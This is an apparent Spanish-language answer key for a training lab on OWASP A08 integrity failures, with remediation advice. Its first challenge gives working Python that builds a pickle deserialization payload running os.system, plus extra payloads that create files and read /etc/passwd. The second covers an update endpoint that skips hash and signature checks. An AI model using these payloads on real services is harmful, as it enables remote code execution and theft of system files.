# A08 – Fallos de Integridad: Soluciones

## Reto 1 – RCE con Pickle

### Paso 1: Generar el payload
Ve a `/a08/generate-payload`, escribe el comando `id` y copia el output en base64.

O directamente desde Python:
```python
import pickle, base64, os

class RCE:
    def __reduce__(self):
        return (os.system, ('id',))

payload = base64.b64encode(pickle.dumps(RCE())).decode()
print(payload)
```

### Paso 2: Enviar a /a08/deserialize
Pega el string en base64 y haz clic en Deserializar.
El servidor ejecuta `os.system('id')` y ves el resultado.

Payloads más impactantes (solo para uso en el lab):
```python
# Listar archivos
return (os.system, ('ls /tmp',))

# Crear un archivo
return (os.system, ('touch /tmp/pwned_por_pickle',))

# Leer archivo sensible
return (os.popen, ('cat /etc/passwd',))
```

**Corrección:** Nunca deserialices datos no confiables. Usa JSON para el intercambio de datos.
Si debes serializar objetos Python, usa `hmac` para firmar el payload y verifica la firma antes de deserializar.

## Reto 2 – Actualización Sin Firma
Navega a `/a08/update` y aplica cualquier versión.
Los campos `sha256` y `signature` son `None` — nunca se verifican.

**Corrección:**
```python
import hashlib, requests

resp = requests.get(manifiesto['url'])
hash_real = hashlib.sha256(resp.content).hexdigest()
if hash_real != manifiesto['sha256']:
    raise ValueError("¡Fallo en la verificación de integridad de la actualización!")
# También verifica la firma GPG para componentes críticos
```
